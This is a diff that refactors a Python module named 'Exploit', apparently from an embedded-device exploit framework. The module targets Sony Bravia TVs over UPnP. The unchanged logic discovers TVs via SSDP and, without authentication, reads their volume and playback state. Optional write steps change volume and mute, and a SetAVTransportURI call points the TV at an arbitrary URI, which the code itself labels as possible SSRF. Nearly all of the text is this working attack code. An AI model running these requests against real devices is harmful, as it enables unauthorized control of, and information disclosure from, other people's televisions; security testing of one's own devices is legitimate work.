@@ -47,19 +47,17 @@ _SOAP_ENVELOPE = (
 )
 
 _SSDP_SEARCH = (
-    "M-SEARCH * HTTP/1.1\r\n"
-    "HOST: 239.255.255.250:1900\r\n"
-    'MAN: "ssdp:discover"\r\n'
-    "MX: 3\r\n"
-    "ST: ssdp:all\r\n\r\n"
-).encode()
+    b"M-SEARCH * HTTP/1.1\r\n"
+    b"HOST: 239.255.255.250:1900\r\n"
+    b'MAN: "ssdp:discover"\r\n'
+    b"MX: 3\r\n"
+    b"ST: ssdp:all\r\n\r\n"
+)
 
 
 def _soap_xml(service, action, inner):
     return _SOAP_ENVELOPE.format(
-        '<u:{action} xmlns:u="{svc}">{inner}</u:{action}>'.format(
-            action=action, svc=service, inner=inner
-        )
+        f'<u:{action} xmlns:u="{service}">{inner}</u:{action}>'
     )
 
 
@@ -102,36 +100,36 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         """Execute the Sony Bravia UPnP security audit."""
-        print_status("Auditing UPnP on {}:{}".format(self.target, self.port))
+        print_status(f"Auditing UPnP on {self.target}:{self.port}")
 
         # SSDP discovery
         uuid = self._ssdp_discover()
         if uuid:
-            print_success("SSDP response from {} (UUID: {})".format(self.target, uuid))
+            print_success(f"SSDP response from {self.target} (UUID: {uuid})")
         else:
             print_warning("No SSDP response (TV may be fully off or on different subnet)")
 
         # Device descriptor
         desc = self._fetch_descriptor()
         if desc:
-            print_success("Device descriptor: {}".format(desc[:80]))
+            print_success(f"Device descriptor: {desc[:80]}")
 
         # Service capability disclosure
         proto = self._get_protocol_info()
         if proto:
-            print_success("GetProtocolInfo: {} chars of sink protocols exposed (no auth)".format(len(proto)))
+            print_success(f"GetProtocolInfo: {len(proto)} chars of sink protocols exposed (no auth)")
 
         # Volume read (information disclosure)
         vol = self._get_volume()
         if vol is not None:
-            print_success("GetVolume: Current volume = {} (unauthenticated)".format(vol))
+            print_success(f"GetVolume: Current volume = {vol} (unauthenticated)")
         else:
             print_error("GetVolume not accessible (TV fully off or service unavailable)")
 
         # Transport state (information disclosure)
         state = self._get_transport_info()
         if state:
-            print_success("GetTransportInfo: State={} (unauthenticated)".format(state))
+            print_success(f"GetTransportInfo: State={state} (unauthenticated)")
 
         # Write tests (optional)
         if str(self.test_write).lower() in ("true", "1", "yes"):
@@ -145,7 +143,7 @@ class Exploit(HTTPClient):
         if ssrf:
             if self._set_av_transport_uri(ssrf):
                 print_success(
-                    "SetAVTransportURI accepted: {} (SSRF possible when TV is on)".format(ssrf)
+                    f"SetAVTransportURI accepted: {ssrf} (SSRF possible when TV is on)"
                 )
 
     def _soap_request(self, service, action, inner_xml, control_path):
@@ -154,10 +152,10 @@ class Exploit(HTTPClient):
         try:
             resp = self.http_request(
                 "POST",
-                "/{}/{}".format(str(int(self.port)), control_path).replace("//{}/".format(int(self.port)), "/"),
+                f"/{str(int(self.port))}/{control_path}".replace(f"//{int(self.port)}/", "/"),
                 data=body,
                 headers={
-                    "SOAPACTION": '"{0}#{1}"'.format(service, action),
+                    "SOAPACTION": f'"{service}#{action}"',
                     "Content-Type": 'text/xml; charset="utf-8"',
                     "User-Agent": "EmbedXPL-Forge/1.0",
                 },
@@ -172,10 +170,10 @@ class Exploit(HTTPClient):
         import urllib.request
         soap = _soap_xml(service, action, inner_xml)
         req = urllib.request.Request(
-            "http://{}:{}/{}".format(self.target, int(self.port), control_path),
+            f"http://{self.target}:{int(self.port)}/{control_path}",
             data=soap.encode("utf-8"),
             headers={
-                "SOAPACTION": '"{0}#{1}"'.format(service, action),
+                "SOAPACTION": f'"{service}#{action}"',
                 "Content-Type": 'text/xml; charset="utf-8"',
                 "User-Agent": "EmbedXPL-Forge/1.0",
             },
@@ -187,7 +185,7 @@ class Exploit(HTTPClient):
         except Exception:
             return None
 
-    def _ssdp_discover(self) -> Optional[str]:
+    def _ssdp_discover(self) -> str | None:
         """Send SSDP M-SEARCH and return device UUID if TV responds."""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
@@ -204,20 +202,20 @@ class Exploit(HTTPClient):
                             if line.upper().startswith("USN:") and "uuid:" in line.lower():
                                 return line.split("uuid:")[-1].split(":")[0].strip()
                         return "discovered"
-                except socket.timeout:
+                except TimeoutError:
                     break
             sock.close()
         except Exception:
             pass
         return None
 
-    def _fetch_descriptor(self) -> Optional[str]:
+    def _fetch_descriptor(self) -> str | None:
         """Fetch the UPnP device descriptor XML."""
         import urllib.request
         for path in ("/description.xml", "/dmr.xml", "/rootDesc.xml", "/"):
             try:
                 with urllib.request.urlopen(
-                    "http://{}:{}{}".format(self.target, int(self.port), path),
+                    f"http://{self.target}:{int(self.port)}{path}",
                     timeout=int(self.timeout),
                 ) as r:
                     snippet = r.read(512).decode("utf-8", errors="replace")
@@ -227,10 +225,10 @@ class Exploit(HTTPClient):
                 continue
         return None
 
-    def _get_protocol_info(self) -> Optional[str]:
+    def _get_protocol_info(self) -> str | None:
         resp = self._soap_post(
             _CM_SVC, "GetProtocolInfo",
-            '<u:GetProtocolInfo xmlns:u="{}"></u:GetProtocolInfo>'.format(_CM_SVC),
+            f'<u:GetProtocolInfo xmlns:u="{_CM_SVC}"></u:GetProtocolInfo>',
             "control/ConnectionManager"
         )
         if resp and "Sink" in resp:
@@ -239,11 +237,11 @@ class Exploit(HTTPClient):
             return m.group(1) if m else resp[:100]
         return None
 
-    def _get_volume(self) -> Optional[int]:
+    def _get_volume(self) -> int | None:
         resp = self._soap_post(
             _RC_SVC, "GetVolume",
-            '<u:GetVolume xmlns:u="{svc}"><InstanceID>0</InstanceID>'
-            "<Channel>Master</Channel></u:GetVolume>".format(svc=_RC_SVC),
+            f'<u:GetVolume xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
+            "<Channel>Master</Channel></u:GetVolume>",
             "control/RenderingControl"
         )
         if resp and "CurrentVolume" in resp:
@@ -253,11 +251,11 @@ class Exploit(HTTPClient):
                 return int(m.group(1))
         return None
 
-    def _get_transport_info(self) -> Optional[str]:
+    def _get_transport_info(self) -> str | None:
         resp = self._soap_post(
             _AVT_SVC, "GetTransportInfo",
-            '<u:GetTransportInfo xmlns:u="{svc}"><InstanceID>0</InstanceID>'
-            "</u:GetTransportInfo>".format(svc=_AVT_SVC),
+            f'<u:GetTransportInfo xmlns:u="{_AVT_SVC}"><InstanceID>0</InstanceID>'
+            "</u:GetTransportInfo>",
             "control/AVTransport"
         )
         if resp and "CurrentTransportState" in resp:
@@ -269,9 +267,9 @@ class Exploit(HTTPClient):
     def _set_volume(self, vol) -> bool:
         resp = self._soap_post(
             _RC_SVC, "SetVolume",
-            '<u:SetVolume xmlns:u="{svc}"><InstanceID>0</InstanceID>'
-            "<Channel>Master</Channel><DesiredVolume>{v}</DesiredVolume>"
-            "</u:SetVolume>".format(svc=_RC_SVC, v=vol),
+            f'<u:SetVolume xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
+            f"<Channel>Master</Channel><DesiredVolume>{vol}</DesiredVolume>"
+            "</u:SetVolume>",
             "control/RenderingControl"
         )
         return bool(resp and "SetVolumeResponse" in resp)
@@ -280,9 +278,9 @@ class Exploit(HTTPClient):
         val = "1" if mute else "0"
         resp = self._soap_post(
             _RC_SVC, "SetMute",
-            '<u:SetMute xmlns:u="{svc}"><InstanceID>0</InstanceID>'
-            "<Channel>Master</Channel><DesiredMute>{v}</DesiredMute>"
-            "</u:SetMute>".format(svc=_RC_SVC, v=val),
+            f'<u:SetMute xmlns:u="{_RC_SVC}"><InstanceID>0</InstanceID>'
+            f"<Channel>Master</Channel><DesiredMute>{val}</DesiredMute>"
+            "</u:SetMute>",
             "control/RenderingControl"
         )
         return bool(resp and "SetMuteResponse" in resp)
@@ -290,10 +288,10 @@ class Exploit(HTTPClient):
     def _set_av_transport_uri(self, uri) -> bool:
         resp = self._soap_post(
             _AVT_SVC, "SetAVTransportURI",
-            '<u:SetAVTransportURI xmlns:u="{svc}"><InstanceID>0</InstanceID>'
-            "<CurrentURI>{uri}</CurrentURI>"
+            f'<u:SetAVTransportURI xmlns:u="{_AVT_SVC}"><InstanceID>0</InstanceID>'
+            f"<CurrentURI>{str(uri)}</CurrentURI>"
             "<CurrentURIMetaData></CurrentURIMetaData>"
-            "</u:SetAVTransportURI>".format(svc=_AVT_SVC, uri=str(uri)),
+            "</u:SetAVTransportURI>",
             "control/AVTransport"
         )
         return bool(resp and "SetAVTransportURIResponse" in resp)
@@ -305,7 +303,7 @@ class Exploit(HTTPClient):
         for path in ("/description.xml", "/dmr.xml", "/"):
             try:
                 with urllib.request.urlopen(
-                    "http://{}:{}{}".format(self.target, int(self.port), path),
+                    f"http://{self.target}:{int(self.port)}{path}",
                     timeout=5,
                 ) as r:
                     content = r.read(256).decode("utf-8", errors="replace")
